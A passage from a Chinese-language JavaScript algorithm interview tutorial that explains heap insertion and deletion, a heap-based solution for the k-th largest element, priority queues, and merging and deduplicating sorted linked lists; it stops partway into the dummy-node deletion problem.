<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b5b1c6f65e49~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=786&amp;h=442&amp;s=26479&amp;e=png" alt="" loading="lazy"/></p>
<h2 data-id="heading-98">堆的基本操作：以大顶堆为例</h2>
<p>大顶堆和小顶堆除了约束条件中的大小关系规则完全相反以外，其它方面都保持高度一致。现在我们以大顶堆为例，一起来看看堆结构有哪些玩法。</p>
<p>这里我给出一个现成的大顶堆：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b5bc43da2b69~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=998&amp;h=762&amp;s=48091&amp;e=png" alt="" loading="lazy"/></p>
<p>很多时候，为了考察你对完全二叉树索引规律的掌握情况，题目中与堆结构同时出现的，还有它的层序遍历序列：</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>]
</code></pre>
<p>（现在赶快回去复习一下完全二叉树的索引规律，我们马上写代码要用到了）</p>
<p>我们需要关注的动作有两个：</p>
<ol>
<li>如何取出堆顶元素（删除操作）</li>
<li>往堆里追加一个元素（插入操作）</li>
</ol>
<p>至于堆的初始化，也只不过是从空堆开始，重复执行动作2而已。因此，上面这两个动作就是堆操作的核心。</p>
<h3 data-id="heading-99">取出堆顶元素</h3>
<p>取出元素本身并不难，难的是如何在删除元素的同时，保持住队的“大顶”结构特性。为了做到这点，我们需要执行以下操作：</p>
<ol>
<li>用堆里的最后一个元素（对应图中的数字1）替换掉堆顶元素。</li>
<li>对比新的堆顶元素（1）与其左右孩子的值，如果其中一个孩子大于堆顶元素，则交换两者的位置：</li>
</ol>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b600c6dc5536~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1000&amp;h=748&amp;s=45175&amp;e=png" alt="" loading="lazy"/>
交换后，继续向下对比1与当前左右孩子的值，如果其中一个大于1，则交换两者的位置：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b606e67443cb~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=954&amp;h=792&amp;s=45666&amp;e=png" alt="" loading="lazy"/>
重复这个<strong>向下对比+交换</strong>的过程，直到无法继续交换为止，我们就得到了一个符合“大顶”原则的新的堆结构：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b612b4981b7c~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=974&amp;h=750&amp;s=39531&amp;e=png" alt="" loading="lazy"/></p>
<p>上述这个反复<strong>向下对比+交换</strong>的过程，用编码实现如下（仔细看注释）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 入参是堆元素在数组里的索引范围，low表示下界，high表示上界</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">downHeap</span>(<span class="hljs-params">low, high</span>) {
    <span class="hljs-comment">// 初始化 i 为当前结点，j 为当前结点的左孩子</span>
    <span class="hljs-keyword">let</span> i=low,j=i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span> 
    <span class="hljs-comment">// 当 j 不超过上界时，重复向下对比+交换的操作</span>
    <span class="hljs-keyword">while</span>(j &lt;= high) {
        <span class="hljs-comment">// 如果右孩子比左孩子更大，则用右孩子和根结点比较</span>
        <span class="hljs-keyword">if</span>(j+<span class="hljs-number">1</span> &lt;= high &amp;&amp; heap[j+<span class="hljs-number">1</span>] &gt; heap[j]) {
            j = j+<span class="hljs-number">1</span>
        }
        
        <span class="hljs-comment">// 若当前结点比孩子结点小，则交换两者的位置，把较大的结点“拱上去”</span>
        <span class="hljs-keyword">if</span>(heap[i] &lt; heap[j]) {
            <span class="hljs-comment">// 交换位置</span>
            <span class="hljs-keyword">const</span> temp = heap[j]  
            heap[j] = heap[i]  
            heap[i] = temp
            
            <span class="hljs-comment">// i 更新为被交换的孩子结点的索引</span>
            i=j  
            <span class="hljs-comment">// j 更新为孩子结点的左孩子的索引</span>
            j=j*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">break</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-100">往堆里追加一个元素</h3>
<p>当添加一个新元素进堆的时候，我们同样需要考虑堆结构的排序原则：</p>
<ol>
<li>新来的数据首先要追加到当前堆里最后一个元素的后面。比如我现在要新增一个10，它就应该排在最后一层的最后一个位置：</li>
</ol>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b62cea61942c~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=962&amp;h=800&amp;s=52650&amp;e=png" alt="" loading="lazy"/>
2. 不断进行<strong>向上对比+交换</strong>的操作：如果发现10比父结点的结点值要大，那么就和父结点的元素相互交换，再接着往上进行比较，直到无法再继续交换为止。首先被比下去的是值为6的直接父结点：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b63d54377138~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=964&amp;h=754&amp;s=58905&amp;e=png" alt="" loading="lazy"/>
接着继续往上找，发现10比根结点9还要大，于是继续进行交换：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b65002f6213a~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1012&amp;h=774&amp;s=61578&amp;e=png" alt="" loading="lazy"/>
根结点被换掉后，再也无法向上比较了。此时，我们已经得到了一个追加过数字10的新的堆结构：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b65707a61d93~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1020&amp;h=750&amp;s=52641&amp;e=png" alt="" loading="lazy"/></p>
<p>上述这个反复<strong>向上对比+交换</strong>的过程，用编码实现如下（仔细看注释）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 入参是堆元素在数组里的索引范围，low表示下界，high表示上界</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">upHeap</span>(<span class="hljs-params">low, high</span>) {
    <span class="hljs-comment">// 初始化 i（当前结点索引）为上界</span>
    <span class="hljs-keyword">let</span> i = high  
    <span class="hljs-comment">// 初始化 j 为 i 的父结点</span>
    <span class="hljs-keyword">let</span> j = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((i-<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>)  
    <span class="hljs-comment">// 当 j 不逾越下界时，重复向上对比+交换的过程</span>
    <span class="hljs-keyword">while</span>(j&gt;=low)  {
        <span class="hljs-comment">// 若当前结点比父结点大</span>
        <span class="hljs-keyword">if</span>(heap[j]&lt;heap[i]) {
            <span class="hljs-comment">// 交换当前结点与父结点，保持父结点是较大的一个</span>
            <span class="hljs-keyword">const</span> temp = heap[j] 
            heap[j] = heap[i]  
            heap[i] = temp
            
            <span class="hljs-comment">// i更新为被交换父结点的位置</span>
            i=j   
            <span class="hljs-comment">// j更新为父结点的父结点</span>
            j=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((i-<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>)  
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">break</span>
        }
    }
}
</code></pre>
<p>上面这两个过程，需要大家反复理解、深刻记忆。尤其是要记住这几个关键字：“<strong>删除</strong>”就是“<strong>向下比较+交换</strong>”，而“<strong>添加</strong>”则是“<strong>向上比较+交换</strong>”。</p>
<pre><code class="hljs language-!" lang="!">这里写给大家的两段代码，在实战中具备一定的通用性。希望大家能够充分熟悉，在理解的基础上记忆。下次如果真的用到，争取能够默写。
</code></pre>
<h2 data-id="heading-101">堆结构在排序中的应用——优先队列</h2>
<p>在认识优先队列之前，我们先来看一道题：</p>
<blockquote>
<p>题目描述：在未排序的数组中找到第 k 个最大的元素。请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。</p>
</blockquote>
<blockquote>
<p>示例 1:<br/>
输入: [3,2,1,5,6,4] 和 k = 2<br/>
输出: 5</p>
</blockquote>
<blockquote>
<p>示例 2:
输入: [3,2,3,1,2,4,5,5,6] 和 k = 4<br/>
输出: 4</p>
</blockquote>
<blockquote>
<p>说明:<br/>
你可以假设 k 总是有效的，且 1 ≤ k ≤ 数组的长度。</p>
</blockquote>
<h3 data-id="heading-102">思路分析</h3>
<p>这道题的诉求非常直接——要求你对给定数组进行排序。关于排序，我们在下一节会展开讲解N种排序算法的实现方式，包括快速排序、归并排序、选择排序等等。<strong>这些排序有一个共同的特点——在排序的过程中，你很难去明确元素之间的大小关系</strong>，只有在排序彻底完成后，你才能找出第 k 大的元素是哪个。</p>
<p>对整个数组进行排序、然后按顺序返回索引为<code>k-1</code>的元素，这正是笔者在面试场上写出的第一个解法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
* <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">nums</span>
* <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">k</span>
* <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>}
*/</span>
<span class="hljs-keyword">const</span> findKthLargest = <span class="hljs-keyword">function</span>(<span class="hljs-params">nums, k</span>) {
 <span class="hljs-comment">// 将数组逆序</span>
 <span class="hljs-keyword">const</span> sorted = nums.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a,b</span>)=&gt;</span> {
     <span class="hljs-keyword">return</span> b-a
 })
 <span class="hljs-comment">// 取第k大的元素</span>
 <span class="hljs-keyword">return</span> sorted[k-<span class="hljs-number">1</span>]
};;
</code></pre>
<p>是的，你没有看错，我甚至没有手动实现任何一个排序算法，而是直接调了 <code>JS</code> 的<code>sort</code> 方法。<br/>
大家不要笑，这个<code>sort</code>方法真的可以救命。如果你理解不了本节接下来要讲的基于堆结构的解法，又没信心记住后面两节涉及的各种各样的花式排序算法。那么你一定要紧紧抓住这个<code>sort</code> <code>API</code>。面试的时候，万一被问到“你为什么不会写xx排序算法”，这时候用一句“我用<code>sort</code>方法比较多，不喜欢自己造轮子”糊弄过去，还是有一定成功率的。</p>
<p>好了，学渣小剧场结束。我们继续来看这个题：有没有一种排序方法能够在不对所有元素进行排序的情况下，帮我们提前定位到第 k 大的元素是哪个呢？当然有——构建一个堆结构就能解决问题！</p>
<p>对于这道题来说，要想求出第 k 大的元素，我们可以维护一个大小为 k 的小顶堆。这个堆的初始化过程可以通过遍历并插入数组的前 k 个元素来实现。当堆被填满后，再尝试用数组的第 k+1 到末尾的这部分元素来更新这个小顶堆，更新过程中遵循以下原则：</p>
<ul>
<li>若遍历到的数字比小顶堆的堆顶元素值大，则用该数字替换掉小顶堆的堆顶元素值</li>
<li>若遍历到的数字比小顶堆的堆顶元素值小，则忽略这个数字</li>
</ul>
<p>仔细想想，为什么要这样做？假设数组中元素的总个数是 <code>n</code>，那么：</p>
<ul>
<li>维护大小为 <code>k</code> 的小顶堆的目的，是为了确保堆中除了堆顶元素之外的 <code>k-1</code> 个元素值都大于堆顶元素。</li>
<li>当我们用数组的<code>[0, k-1]</code>区间里的 数字初始化完成这个堆时，堆顶元素值就对应着前 <code>k</code> 个数字里的最小值。</li>
<li>紧接着我们尝试用索引区间为 [k, n-1]的数字来更新堆，在这个过程中，<strong>只允许比堆顶元素大的值进入堆</strong>。这一波操作过后，堆里的 <code>k</code> 个数字就是整个数组中最大的 <code>k</code> 个数字，而堆顶的数字正是这 k 个数中最小的那个。于是本题得解。</li>
</ul>
<p>我们用示例中的<code>[3,2,1,5,6,4]</code>这个序列来模拟一下上面的过程。初始化一个规模为 <code>k=2</code> 的小顶堆，它长这样：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">    2
   /
  3
</span></code></pre>
<p>用<code>[k, n-1]</code>索引范围内的元素来更新这个小顶堆：首先是用索引为2的数字1来试，发现1比堆顶的2还要小，忽略它。接着用索引为3的5来试，5是比2大的，用它把2换掉：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">    5
   /
  3
</span></code></pre>
<p>经过向下对比+调整，新的堆长这样：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">    3
   /
  5
</span></code></pre>
<p>我们发现，现在这个堆里面保存的正是索引范围[0, 3]内的前 <code>k</code> 个最大的数。以此类推，当对数组中最后一个元素执行过尝试入堆的逻辑后，堆里面保存的就是整个数组范围内的前 <code>k</code> 个最大的数。</p>
<p>在解题的过程中，不出所料地用到了上文中提及的<code>downHeap</code>方法和<code>upHeap</code> 方法。不过大家千万不要直接复制粘贴，别忘了，前面我们是用大顶堆举例，这道题需要构造的是小顶堆——记得调整大小关系规则。</p>
<p>（一切尽在注释中，不要只记得抄代码啊年轻人）</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
* <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">nums</span>
* <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">k</span>
* <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>}
*/</span>
<span class="hljs-keyword">const</span> findKthLargest = <span class="hljs-keyword">function</span>(<span class="hljs-params">nums, k</span>) {
   <span class="hljs-comment">// 初始化一个堆数组</span>
   <span class="hljs-keyword">const</span> heap = []  
   <span class="hljs-comment">// n表示堆数组里当前最后一个元素的索引</span>
   <span class="hljs-keyword">let</span> n = <span class="hljs-number">0</span>
   <span class="hljs-comment">// 缓存 nums 的长度</span>
   <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>  
   <span class="hljs-comment">// 初始化大小为 k 的堆</span>
   <span class="hljs-keyword">function</span> <span class="hljs-title function_">createHeap</span>(<span class="hljs-params"/>) {
       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;k;i++) {
           <span class="hljs-comment">// 逐个往堆里插入数组中的数字</span>
           <span class="hljs-title function_">insert</span>(nums[i])
       }
   }
   
   <span class="hljs-comment">// 尝试用 [k, n-1] 区间的元素更新堆</span>
   <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateHeap</span>(<span class="hljs-params"/>) {
       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=k;i&lt;len;i++) {
           <span class="hljs-comment">// 只有比堆顶元素大的才有资格进堆</span>
           <span class="hljs-keyword">if</span>(nums[i]&gt;heap[<span class="hljs-number">0</span>]) {
               <span class="hljs-comment">// 用较大数字替换堆顶数字</span>
               heap[<span class="hljs-number">0</span>] = nums[i]  
               <span class="hljs-comment">// 重复向下对比+交换的逻辑</span>
               <span class="hljs-title function_">downHeap</span>(<span class="hljs-number">0</span>, k)
           }
       }
   }
   
   <span class="hljs-comment">// 向下对比函数</span>
   <span class="hljs-keyword">function</span> <span class="hljs-title function_">downHeap</span>(<span class="hljs-params">low, high</span>) {
       <span class="hljs-comment">// 入参是堆元素在数组里的索引范围，low表示下界，high表示上界</span>
       <span class="hljs-keyword">let</span> i=low,j=i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span> 
       <span class="hljs-comment">// 当 j 不超过上界时，重复向下对比+交换的操作</span>
       <span class="hljs-keyword">while</span>(j&lt;=high) {
           <span class="hljs-comment">// // 如果右孩子比左孩子更小，则用右孩子和根结点比较</span>
           <span class="hljs-keyword">if</span>(j+<span class="hljs-number">1</span>&lt;=high &amp;&amp; heap[j+<span class="hljs-number">1</span>]&lt;heap[j]) {
               j = j+<span class="hljs-number">1</span>
           }
           
           <span class="hljs-comment">// 若当前结点比孩子结点大，则交换两者的位置，把较小的结点“拱上去”</span>
           <span class="hljs-keyword">if</span>(heap[i] &gt; heap[j]) {
               <span class="hljs-comment">// 交换位置</span>
               <span class="hljs-keyword">const</span> temp = heap[j]  
               heap[j] = heap[i]  
               heap[i] = temp
               
               <span class="hljs-comment">// i 更新为被交换的孩子结点的索引</span>
               i=j  
               <span class="hljs-comment">// j 更新为孩子结点的左孩子的索引</span>
               j=j*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>
           } <span class="hljs-keyword">else</span> {
               <span class="hljs-keyword">break</span>
           }
       }
   }
   
   <span class="hljs-comment">// 入参是堆元素在数组里的索引范围，low表示下界，high表示上界</span>
   <span class="hljs-keyword">function</span> <span class="hljs-title function_">upHeap</span>(<span class="hljs-params">low, high</span>) {
       <span class="hljs-comment">// 初始化 i（当前结点索引）为上界</span>
       <span class="hljs-keyword">let</span> i = high  
       <span class="hljs-comment">// 初始化 j 为 i 的父结点</span>
       <span class="hljs-keyword">let</span> j = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((i-<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>)  
       <span class="hljs-comment">// 当 j 不逾越下界时，重复向上对比+交换的过程</span>
       <span class="hljs-keyword">while</span>(j&gt;=low)  {
           <span class="hljs-comment">// 若当前结点比父结点小</span>
           <span class="hljs-keyword">if</span>(heap[j]&gt;heap[i]) {
               <span class="hljs-comment">// 交换当前结点与父结点，保持父结点是较小的一个</span>
               <span class="hljs-keyword">const</span> temp = heap[j] 
               heap[j] = heap[i]  
               heap[i] = temp
               
               <span class="hljs-comment">// i更新为被交换父结点的位置</span>
               i=j   
               <span class="hljs-comment">// j更新为父结点的父结点</span>
               j=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((i-<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>)  
           } <span class="hljs-keyword">else</span> {
               <span class="hljs-keyword">break</span>
           }
       }
   }

   <span class="hljs-comment">// 插入操作=将元素添加到堆尾部+向上调整元素的位置</span>
   <span class="hljs-keyword">function</span> <span class="hljs-title function_">insert</span>(<span class="hljs-params">x</span>) {
       heap[n] = x  
       <span class="hljs-title function_">upHeap</span>(<span class="hljs-number">0</span>, n)
       n++
   }
   
   <span class="hljs-comment">// 调用createHeap初始化元素个数为k的队</span>
   <span class="hljs-title function_">createHeap</span>()
   <span class="hljs-comment">// 调用updateHeap更新堆的内容，确保最后堆里保留的是最大的k个元素</span>
   <span class="hljs-title function_">updateHeap</span>()
   <span class="hljs-comment">// 最后堆顶留下的就是最大的k个元素中最小的那个，也就是第k大的元素</span>
   <span class="hljs-keyword">return</span> heap[<span class="hljs-number">0</span>]
};
</code></pre>
<h3 data-id="heading-103">编码复盘</h3>
<p>上面这个题解中出现的 <code>heap</code> 数组，就是一个优先队列。<br/>
优先队列的本质是二叉堆结构，它具有以下特性：</p>
<ul>
<li>队列的头部元素，也即索引为0的元素，就是整个数组里的最值——最大值或者最小值</li>
<li>对于索引为 <code>i</code> 的元素来说，它的父结点下标是 <code>(i-1)/2</code>（上面咱们讲过了，这与完全二叉树的结构特性有关）</li>
<li>对于索引为 <code>i</code> 的元素来说，它的左孩子下标应为<code>2*i+1</code>，右孩子下标应为<code>2*i+2</code>。</li>
</ul>
<p>当题目中出现类似于“第<code>k</code>大”或者“第<code>k</code>高“这样的关键字时，就是在暗示你用优先队列/堆结构来做题——这样的手法可以允许我们在不对序列进行完全排序的情况下，找到第 <code>k</code> 个最值。</p>
<p>在其它语言的算法面试中，优先队列可以直接借助语言本身提供的数据结构来实现（比如<code>JAVA</code>中的<code>priority_queue</code>）。但在 <code>JS</code> 中，我们只能手动造轮子。因此，优先队列在前端算法面试中的权重并不高。如果本节内容让你感觉学起来有难度，那么也不用灰心，更不必焦虑——把握好下一节开始的排序算法专题，上了考场你仍然是一条好汉。</p>
<p>链表结构相对数组、字符串来说，稍微有那么一些些复杂，所以针对链表的真题戏份也相对比较多。<br/>
前面咱们说过，数组、字符串若想往难了出，那一定是要结合一些超越数据结构本身的东西——比如排序算法、二分思想、动态规划思想等等。因此，这部分对应的难题、综合题，我们需要等知识体系完全构建起来之后，在真题训练环节重新复盘。</p>
<p>但是链表可不一样了。如果说在命题时，数组和字符串的角色往往是“算法思想的载体”，那么链表本身就可以被认为是“命题的目的”。单在真题归纳解读环节，我们能讲的技巧、能做的题目已经有很多。结合实际面试中的命题规律，我把这些题目分为以下三类：</p>
<ul>
<li>链表的处理：合并、删除等（删除操作画个记号，重点中的重点！）</li>
<li>链表的反转及其衍生题目</li>
<li>链表成环问题及其衍生题目</li>
</ul>
<p>本节我们就以链表的处理为切入点，一步一步走进链表的世界。</p>
<h2 data-id="heading-104">链表的合并</h2>
<blockquote>
<p>真题描述：将两个有序链表合并为一个新的有序链表并返回。新链表是通过拼接给定的两个链表的所有结点组成的。 </p>
</blockquote>
<blockquote>
<p>示例：
输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4
输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</p>
</blockquote>
<h3 data-id="heading-105">思路分析</h3>
<p>做链表处理类问题，大家要把握住一个中心思想——<strong>处理链表的本质，是处理链表结点之间的指针关系</strong>。<br/>
这道题也不例外，我们先来看看处理前两个链表的情况：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/17/170e6ca5dffda391~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=986&amp;h=482&amp;s=27136&amp;e=png" alt="" loading="lazy"/></p>
<p>两个链表如果想要合并为一个链表，我们恰当地补齐双方之间结点 next 指针的指向关系，就能达到目的。<br/>
如果这么说仍然让你觉得抽象，那么大家不妨把图上的6个结点想象成6个扣子：现在的情况是，6个扣子被分成了两拨，各自由一根线把它们穿起来。而我们的目的是让这六个扣子按照一定的顺序，串到一根线上去。这时候需要咱们做的就是一个<strong>穿针引线</strong>的活儿，现在线有了，咱缺的是一根针：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/17/170e6cfd9e7a2b23~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1040&amp;h=480&amp;s=29196&amp;e=png" alt="" loading="lazy"/><br/>
这根针每次钻进扣子眼儿之前，要先比较一下它眼前的两个扣子，选择其中值较小的那个，优先把它串进去。一次串一个，直到所有的扣子都被串进一条线为止（下图中红色箭头表明穿针的过程与方向）：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/17/170e6dffa1beb99f~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1130&amp;h=478&amp;s=47865&amp;e=png" alt="" loading="lazy"/></p>
<p>同时我们还要考虑 l1 和 l2 两个链表长度不等的情况：若其中一个链表已经完全被串进新链表里了，而另一个链表还有剩余结点，考虑到该链表本身就是有序的，我们可以直接把它整个拼到目标链表的尾部。</p>
<h3 data-id="heading-106">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">l1</span>
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">l2</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">ListNode</span>}
 */</span>
<span class="hljs-keyword">const</span> mergeTwoLists = <span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) {
  <span class="hljs-comment">// 定义头结点，确保链表可以被访问到</span>
  <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>()
  <span class="hljs-comment">// cur 这里就是咱们那根“针”</span>
  <span class="hljs-keyword">let</span> cur = head
  <span class="hljs-comment">// “针”开始在 l1 和 l2 间穿梭了</span>
  <span class="hljs-keyword">while</span>(l1 &amp;&amp; l2) {
      <span class="hljs-comment">// 如果 l1 的结点值较小</span>
      <span class="hljs-keyword">if</span>(l1.<span class="hljs-property">val</span>&lt;=l2.<span class="hljs-property">val</span>) {
          <span class="hljs-comment">// 先串起 l1 的结点</span>
          cur.<span class="hljs-property">next</span> = l1
          <span class="hljs-comment">// l1 指针向前一步</span>
          l1 = l1.<span class="hljs-property">next</span>
      } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// l2 较小时，串起 l2 结点</span>
          cur.<span class="hljs-property">next</span> = l2
          <span class="hljs-comment">// l2 向前一步</span>
          l2 = l2.<span class="hljs-property">next</span>
      }
      
      <span class="hljs-comment">// “针”在串起一个结点后，也会往前一步</span>
      cur = cur.<span class="hljs-property">next</span> 

  }
  
  <span class="hljs-comment">// 处理链表不等长的情况</span>
  cur.<span class="hljs-property">next</span> = l1!==<span class="hljs-literal">null</span>?<span class="hljs-attr">l1</span>:l2
  <span class="hljs-comment">// 返回起始结点</span>
  <span class="hljs-keyword">return</span> head.<span class="hljs-property">next</span>
};
</code></pre>
<h2 data-id="heading-107">链表结点的删除</h2>
<p>我们先来看一道基础题目：</p>
<blockquote>
<p>真题描述：给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。</p>
</blockquote>
<blockquote>
<p>示例 1:<br/>
输入: 1-&gt;1-&gt;2<br/>
输出: 1-&gt;2<br/>
示例 2:<br/>
输入: 1-&gt;1-&gt;2-&gt;3-&gt;3<br/>
输出: 1-&gt;2-&gt;3</p>
</blockquote>
<h3 data-id="heading-108">思路分析</h3>
<p>链表的删除是一个基础且关键的操作，我们在数据结构部分就已经对该操作的编码实现进行过介绍，这里直接复用大家已经学过的删除能力，将需要删除的目标结点的前驱结点 next 指针往后指一格：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/17/170e6f3b38195ccf~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1152&amp;h=404&amp;s=29916&amp;e=png" alt="" loading="lazy"/>
判断两个元素是否重复，由于此处是已排序的链表，我们直接判断前后两个元素值是否相等即可。</p>
<h3 data-id="heading-109">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">head</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">ListNode</span>}
 */</span>
<span class="hljs-keyword">const</span> deleteDuplicates = <span class="hljs-keyword">function</span>(<span class="hljs-params">head</span>) {
    <span class="hljs-comment">// 设定 cur 指针，初始位置为链表第一个结点</span>
    <span class="hljs-keyword">let</span> cur = head;
    <span class="hljs-comment">// 遍历链表</span>
    <span class="hljs-keyword">while</span>(cur != <span class="hljs-literal">null</span> &amp;&amp; cur.<span class="hljs-property">next</span> != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 若当前结点和它后面一个结点值相等（重复）</span>
        <span class="hljs-keyword">if</span>(cur.<span class="hljs-property">val</span> === cur.<span class="hljs-property">next</span>.<span class="hljs-property">val</span>) {
            <span class="hljs-comment">// 删除靠后的那个结点（去重）</span>
            cur.<span class="hljs-property">next</span> = cur.<span class="hljs-property">next</span>.<span class="hljs-property">next</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 若不重复，继续遍历</span>
            cur = cur.<span class="hljs-property">next</span>;
        }
    }
    <span class="hljs-keyword">return</span> head;
};
</code></pre>
<p>大家不要小看了这么一道简简单单的基础题目，在实际面试中，下不了笔的、写不囫囵的、写了跑不起来的，大有人在。<br/>
一道题之所以能够成为面试题，一定有其考察意义在。拿这道题来说，既能考察你链表的遍历（while循环），又能考察你链表的 CRUD 中最热门的删除操作，候选人做这道题的情况，一定程度上可以反馈其基本功的扎实度。做对了是正常，如果做不对，那么在算法和数据结构这个考察环节，你的处境就有点危险了。</p>
<h2 data-id="heading-110">删除问题的延伸——dummy 结点登场</h2>
<blockquote>
<p>真题描述：给定一个排序链表，删除所有含有重复数字的结点，只保留原始链表中 没有重复出现的数字。</p>
</blockquote>
<blockquote>
<p>示例 1:<br/>
输入: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5<br/>
输出: 1-&gt;2-&gt;5<br/>
示例 2:<br/>
输入: 1-&gt;1-&gt;1-&gt;2-&gt;3<br/>
输出: 2-&gt;3</p>
</blockquote>
<h3 data-id="heading-111">思路分析</h3>
<p>我们先来分析一下这道题和上道题有什么异同哈：相同的地方比较明显，都是删除重复元素。不同的地方在于，楼上我们删到没有重复元素就行了，可以留个“独苗”；但现在，题干要求我们只要一个元素发生了重复，就要把它彻底从链表中干掉，一个不留。</p>
<p>这带来了一个什么问题呢？我们回顾一下前面咱们是怎么做删除的：在遍历的过程中判断当前结点和后继结点之间是否存在值相等的情况，若有，直接对后继结点进行删除：<br/>
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/17/170e6f3b38195ccf~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1152&amp;h=404&amp;s=29916&amp;e=png" alt="" loading="lazy"/></p>
<p>这个过程非常自然，为啥？因为咱们要删除某一个目标结点时，必须知道它的<strong>前驱结点</strong>。在上图中，我们本来就是站在前驱结点的位置，对其后继结点进行删除，只需要将前驱结点的 next 指针往后挪一位就行了。</p>
<p>但是现在，咱们要做的事情变成了把前驱和后继一起删掉，前面两个值为1的结点要一起狗带才行，起始结点直接变成了第三个：</p>
